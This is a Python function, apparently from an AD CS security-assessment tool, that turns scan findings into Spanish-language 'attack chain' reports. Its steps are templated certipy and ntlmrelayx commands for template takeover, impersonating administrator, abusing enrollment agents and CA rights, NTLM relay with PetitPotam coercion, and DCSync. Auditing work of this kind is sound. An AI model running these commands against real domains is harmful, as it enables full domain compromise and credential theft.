from typing import Dict, Any, List

def analyze_combo_chains(
    resultados: List[Dict[str, Any]], 
    esc7_results: List[Dict[str, Any]], 
    esc8_results: List[Dict[str, Any]], 
    certifried_results: Dict[str, Any],
    hybrid_results: Dict[str, Any] = None,
    shadow_results: List[Dict[str, Any]] = None,
    **kwargs
) -> List[Dict[str, Any]]:
    def _get_status(val):
        if isinstance(val, dict):
            return str(val.get("status") or "").upper()
        return str(val or "").upper()

    chains = []
    hybrid_results = hybrid_results or {}
    shadow_results = shadow_results or []
    
    hybrid_detected = hybrid_results.get("hybrid_detected", False)
    sync_accounts = hybrid_results.get("sync_accounts", [])
    
    # Analyze CA-level ESCs across all available CA objects
    has_esc6 = any(
        (ca.get("ESC6") or "").upper() in ["EXPLOITABLE", "NEAR_MISS"]
        for tpl in resultados for ca in tpl.get("ESC6_CA_Level", [])
    )
    has_esc7 = any((ca.get("ESC7_CA") or "").upper() in ["EXPLOITABLE", "NEAR_MISS"] for ca in esc7_results)
    has_esc8 = any((ca.get("ESC8_CA") or "").upper() in ["EXPLOITABLE", "NEAR_MISS"] for ca in esc8_results)

    username = kwargs.get("username", "attacker")
    domain = kwargs.get("domain", "domain")
    dc_ip = kwargs.get("dc_ip", "dc-ip")
    pass_str = "pass" # Password we just display 'pass' or '<pass>'
    
    vulnerable_cas = []
    if esc7_results: vulnerable_cas.extend([ca.get('ca_name', 'CA_DESCONOCIDA') for ca in esc7_results])
    if esc8_results: vulnerable_cas.extend([ca.get('service_name', 'CA_DESCONOCIDA') for ca in esc8_results])
    if resultados and resultados[0].get("ESC6_CA_Level"): vulnerable_cas.extend([ca.get('ca_name', 'CA_DESCONOCIDA') for ca in resultados[0]["ESC6_CA_Level"]])
    ca_template_map = kwargs.get("ca_template_map", {})
    # 1. Template Takeover (ESC4 -> ESC1)
    for tpl in resultados:
        esc4_status = _get_status(tpl.get("ESC4"))
        if esc4_status in ["EXPLOITABLE", "NEAR_MISS"]:
            ekus = tpl.get("ekus", [])
            client_auth = "1.3.6.1.5.5.7.3.2" in ekus or "Any Purpose" in ekus or len(ekus) == 0
            if client_auth and tpl.get("is_published", False):
                tpl_name = tpl.get("cn", "Template")
                cas_que_publican = ca_template_map.get(tpl_name, [])
                if not cas_que_publican:
                    cas_que_publican = [{"ca_name": "<CA desconocida>", "ca_host": "<Host desconocido>"}]
                
                for ca_obj in cas_que_publican:
                    ca_name_real = ca_obj['ca_name']
                    chains.append({
                        "name": f"Template Takeover via {tpl_name} (ESC4 → ESC1) en {ca_name_real}",
                        "severity": "Critical",
                        "escs": ["ESC4", "ESC1"],
                        "description": f"Un atacante con permisos de escritura sobre la plantilla '{tpl_name}' (ESC4) puede modificarla para habilitar 'Enrollee Supplies Subject' y convertirla en ESC1, solicitando un certificado de administrador a la CA '{ca_name_real}'.",
                        "steps": [
                            f"1. Escribir en la plantilla {tpl_name}: certipy template -u {username}@{domain} -p {pass_str} -dc-ip {dc_ip} -template {tpl_name} -save {tpl_name}_backup.json",
                            f"2. Modificar plantilla a vulnerable (ESC1): certipy template -u {username}@{domain} -p {pass_str} -dc-ip {dc_ip} -template {tpl_name} -set enrollee_supplies_subject=True",
                            f"3. Solicitar certificado como admin: certipy req -u {username}@{domain} -p {pass_str} -dc-ip {dc_ip} -ca \"{ca_name_real}\" -template {tpl_name} -upn administrator@{domain}",
                            f"4. Autenticar con el certificado: certipy auth -pfx administrator.pfx -dc-ip {dc_ip} -domain {domain}",
                            f"5. Restaurar configuración original: certipy template -u {username}@{domain} -p {pass_str} -dc-ip {dc_ip} -template {tpl_name} -load {tpl_name}_backup.json"
                        ]
                    })
                    
                    # SUPER CHAIN: "Hybrid Impact via Template Takeover"
                    if hybrid_detected:
                        tenant = hybrid_results.get("tenant", "Entra ID")
                        chains.append({
                            "name": f"Hybrid Impact via Template Takeover ({tpl_name} en {ca_name_real})",
                            "severity": "Critical",
                            "escs": ["ESC4", "ESC1"],
                            "cloud_impact": True,
                            "description": f"️ IMPACTO CLOUD POTENCIAL: Este dominio sincroniza identidades con {tenant}. Si la CA {ca_name_real} está registrada como trusted para CBA en Entra ID, el certificado obtenido en el Paso 3 puede ser válido también para autenticarse en recursos cloud.\n\nVerificar en: portal.azure.com → Entra ID → Security → Authentication methods → Certificate-based authentication → Certification Authorities",
                            "steps": [
                                f"1. Tomar control de la plantilla '{tpl_name}' vía ESC4.",
                                "2. Solicitar certificado forjando la identidad (UPN) de un usuario sincronizado.",
                                f"3. Usar el certificado para autenticarse en los servicios de {tenant}."
                            ]
                        })

    # 2. Certifried Revival (ESC6 + ESC9)
    if has_esc6:
        for tpl in resultados:
            esc9_status = _get_status(tpl.get("ESC9"))
            if esc9_status in ["EXPLOITABLE", "NEAR_MISS"] and tpl.get("is_published", False):
                tpl_name = tpl.get('cn', 'Template')
                cas_que_publican = ca_template_map.get(tpl_name, [])
                ca_name_real = cas_que_publican[0]['ca_name'] if cas_que_publican else "<CA desconocida>"
                chains.append({
                    "name": "Certifried Revival Chain (ESC6 + ESC9)",
                    "severity": "Critical",
                    "escs": ["ESC6", "ESC9"],
                    "description": "El flag EDITF_ATTRIBUTESUBJECTALTNAME2 está habilitado en la CA (ESC6) y existe una plantilla sin la extensión SID de seguridad (ESC9). Esto permite bypassear KB5014754 en entornos parcheados inyectando un SAN arbitrario que será aceptado por Kerberos vía UPN.",
                    "steps": [
                        "1. Comprometer cuenta de bajo privilegio.",
                        f"2. Solicitar certificado de la plantilla {tpl_name} inyectando UPN: certipy req -u {username}@{domain} -p {pass_str} -dc-ip {dc_ip} -ca \"{ca_name_real}\" -template {tpl_name} -upn Administrator",
                        "3. El certificado generado NO incluirá la extensión szOID_NTDS_CA_SECURITY_EXT debido al flag de la plantilla.",
                        "4. Autenticar vía PKINIT: certipy auth -pfx administrator.pfx. El KDC mapeará correctamente por UPN al no existir la extensión SID."
                    ]
                })
                break

    # 3. Enrollment Agent Escalation (ESC3 + ESC1/ESC2)
    has_esc3_agent = False
    for tpl in resultados:
        if _get_status(tpl.get("ESC3")) in ["EXPLOITABLE", "NEAR_MISS"]:
            has_esc3_agent = True
            break
            
    if has_esc3_agent:
        for tpl in resultados:
            client_auth = "1.3.6.1.5.5.7.3.2" in tpl.get("ekus", []) or len(tpl.get("ekus", [])) == 0
            if client_auth and tpl.get("is_published", False):
                # Valid target for 'enroll on behalf of'
                enroll_flag = tpl.get("enroll_flag", 0)
                req_mgr = bool(enroll_flag & 0x02)
                if not req_mgr:
                    tpl_name = tpl.get('cn', 'Template')
                    cas_que_publican = ca_template_map.get(tpl_name, [])
                    ca_name_real = cas_que_publican[0]['ca_name'] if cas_que_publican else "<CA desconocida>"
                    chains.append({
                        "name": "Enrollment Agent Escalation Chain (ESC3 + ESC1/ESC2)",
                        "severity": "Critical",
                        "escs": ["ESC3", "ESC1/ESC2"],
                        "description": "Existe una plantilla vulnerable a ESC3 (Enrollment Agent) y otra plantilla con Client Auth que no requiere aprobación del manager. Esto permite a un agente solicitar un certificado en nombre de cualquier otro usuario (incluyendo admins).",
                        "steps": [
                            f"1. Solicitar certificado de Enrollment Agent: certipy req -u {username} -p {pass_str} -ca \"{ca_name_real}\" -template ESC3_Template",
                            f"2. Solicitar certificado en nombre del Administrator: certipy req -u {username} -p {pass_str} -ca \"{ca_name_real}\" -template {tpl_name} -on-behalf-of 'domain\\administrator' -pfx agent.pfx",
                            "3. Autenticar como Administrator usando el certificado forjado."
                        ]
                    })
                    break

    # 4. CA Admin Backdoor (ESC7 + ESC1)
    if has_esc7:
        for tpl in resultados:
            client_auth = "1.3.6.1.5.5.7.3.2" in tpl.get("ekus", []) or len(tpl.get("ekus", [])) == 0
            if client_auth:
                enroll_flag = tpl.get("enroll_flag", 0)
                pend_all = bool(enroll_flag & 0x02)  # PEND_ALL_REQUESTS
                if pend_all:
                    tpl_name = tpl.get('cn', 'Template')
                    cas_que_publican = ca_template_map.get(tpl_name, [])
                    ca_name_real = cas_que_publican[0]['ca_name'] if cas_que_publican else "<CA desconocida>"
                    chains.append({
                        "name": "CA Admin Backdoor Chain (ESC7 + ESC1/ESC2)",
                        "severity": "Critical",
                        "escs": ["ESC7", "ESC1"],
                        "description": "Un atacante con privilegios de ManageCA/ManageCertificates (ESC7) puede aprobar sus propias solicitudes pendientes en plantillas fuertes que requieran aprobación explícita.",
                        "steps": [
                            f"1. Solicitar certificado en plantilla protegida (quedará Pending): certipy req -u {username} -p {pass_str} -ca \"{ca_name_real}\" -template {tpl_name} -upn Administrator",
                            "2. Anotar el ID de la solicitud devuelta (ej. Request ID: 15).",
                            f"3. Como ManageCertificates, emitir la solicitud pendiente: certipy ca -u {username} -p {pass_str} -ca \"{ca_name_real}\" -issue-request 15",
                            f"4. Descargar el certificado emitido: certipy req -u {username} -p {pass_str} -ca \"{ca_name_real}\" -retrieve 15",
                            "5. Autenticar vía PKINIT."
                        ]
                    })
                    break

    # 5. Relay to DC (Certifried + ESC8)
    if has_esc8 and certifried_results and certifried_results.get("machine_account_quota", 0) > 0:
        chains.append({
            "name": "Relay-to-DC Chain (Certifried + ESC8)",
            "severity": "Critical",
            "escs": ["CERTIFRIED", "ESC8"],
            "description": "Un atacante puede crear una cuenta de equipo, setear el dNSHostName al del DC, coercionar autenticación del DC usando CoerceAuth y hacer relay de la misma a la interfaz HTTP de Web Enrollment (ESC8) para obtener el certificado del DC.",
            "steps": [
                "1. Crear machine account: certipy account create ...",
                "2. Setear dNSHostName: certipy account update -user new$ -dns dc.domain.local",
                "3. Iniciar ntlmrelayx.py apuntando a Web Enrollment: ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine",
                "4. Coercionar autenticación del DC hacia el atacante (PetitPotam/PrinterBug).",
                "5. Relay exitoso captura el certificado Machine del DC para DCSync."
            ]
        })

    # --- SUPER CHAINS (HYBRID IMPACT) ---
    if hybrid_detected:
        # SUPER CHAIN 1: Hybrid Full Compromise
        has_esc4 = any((tpl.get("ESC4") or "").upper() in ["EXPLOITABLE", "NEAR_MISS"] for tpl in resultados)
        machine_published = certifried_results and certifried_results.get("machine_template_published")
        static_sync_pwd = any("STATIC_PASSWORD" in risk for a in sync_accounts for risk in a.get("risks", []))
        
        if has_esc4 and machine_published and static_sync_pwd:
            chains.append({
                "name": "Hybrid Full Compromise Chain",
                "severity": "Critical",
                "escs": ["ESC4", "ESC1"],
                "cloud_impact": True,
                "description": "El atacante compromete la CA on-premise mediante ESC4/ESC1, logrando impersonar a cuentas de sincronización con contraseñas estáticas, facilitando pivot hacia el tenant cloud si Certificate-Based Authentication está habilitado.",
                "steps": [
                    "1. Modificar plantilla (ESC4) para habilitar ESC1.",
                    "2. Solicitar certificado como cuenta de sincronización MSOL/AAD.",
                    "3. Autenticarse contra recursos cloud si CBA en Entra ID acepta la CA on-premise."
                ]
            })

        # SUPER CHAIN 2: Sync Account Takeover
        sync_takeover = False
        target_sync_acct = None
        for a in sync_accounts:
            if "STATIC_PASSWORD" in "".join(a.get("risks", [])):
                for sr in shadow_results:
                    if sr.get("cross_module_alert") and sr.get("target_account", "").lower().startswith(a["samAccountName"].lower()):
                        sync_takeover = True
                        target_sync_acct = a["samAccountName"]
                        break
            if sync_takeover: break
            
        if sync_takeover:
            chains.append({
                "name": "Sync Account Takeover Chain",
                "severity": "Critical",
                "escs": ["SHADOW_CREDENTIALS"],
                "cloud_impact": True,
                "description": f"Se detectó la cuenta de sincronización {target_sync_acct} con contraseña antigua (>365 días) Y permisos débiles de escritura (Shadow Credentials) sobre ella. Permite DCSync y compromiso cloud.",
                "steps": [
                    f"1. Escribir credencial (msDS-KeyCredentialLink) sobre la cuenta de sincronización {target_sync_acct}.",
                    f"2. Obtener Ticket Granting Ticket (TGT) como {target_sync_acct} vía PKINIT.",
                    "3. Extraer todos los hashes del dominio (DCSync).",
                    "4. Pivotear a entorno cloud mediante Pass-the-Hash si aplica."
                ]
            })

        # SUPER CHAIN 3: Certifried + Hybrid
        certifried_applicable = certifried_results and certifried_results.get("machine_account_quota", 0) > 0 and certifried_results.get("machine_template_published")
        if certifried_applicable:
            chains.append({
                "name": "Certifried Hybrid Chain",
                "severity": "Critical",
                "escs": ["CERTIFRIED"],
                "cloud_impact": True,
                "description": "Explotación de Certifried en un entorno híbrido. Compromiso a nivel de Domain Controller mediante cuenta de máquina falsa, permitiendo recolección de hashes y acceso potencial al tenant cloud.",
                "steps": [
                    "1. Crear machine account y setear dNSHostName al nombre del DC.",
                    "2. Solicitar certificado de la plantilla Machine (Certifried).",
                    "3. Autenticarse como DC y hacer DCSync.",
                    "4. Obtener acceso a cuentas sincronizadas y moverse lateralmente a la nube."
                ]
            })

    return chains
